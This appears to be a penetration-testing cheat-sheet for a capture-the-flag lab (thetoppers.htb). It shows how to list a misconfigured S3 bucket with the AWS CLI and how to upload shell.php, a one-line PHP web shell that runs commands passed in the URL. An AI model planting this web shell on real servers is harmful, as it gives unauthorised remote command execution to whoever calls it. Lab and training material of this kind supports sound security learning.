- [aws bucket list](#awsbl)
- [aws reverse shell](#awsrs)

## aws bucket list <a name="awsbl"></a>

The `aws bucket list` command is used to list the contents of the buckets found within a subdomain hosted on AWS. It is useful for finding files such as `index.php`, etc.

- `endpoint`: URL where S3 is located (replace with `s3` or another subdomain if found).
- `s3`: Interacts with the S3 service (replace with the discovered subdomain from gobuster subdomain search).
- `ls`: Lists the directory.
- `s3://{bucket name}`: Name of the bucket to interact with.

````bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
````

## aws reverse shell <a name="awsrs"></a>

The `aws reverse shell` command is used to copy files from your local machine to one of the AWS buckets. After copying the file, you can access it and enter commands.

- `endpoint`: URL where S3 is located (replace with `s3` or another subdomain if found).
- `s3`: Interacts with the S3 service (replace with the discovered subdomain from gobuster subdomain search).
- `cp`: Copies the specified file, in this case, `shell.php`, to the bucket.
- `shell.php`: The file to be copied, containing `<?php system($_GET["cmd"]); ?>` code.
- `s3://{bucket name}`: Name of the bucket to interact with.

````bash
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
````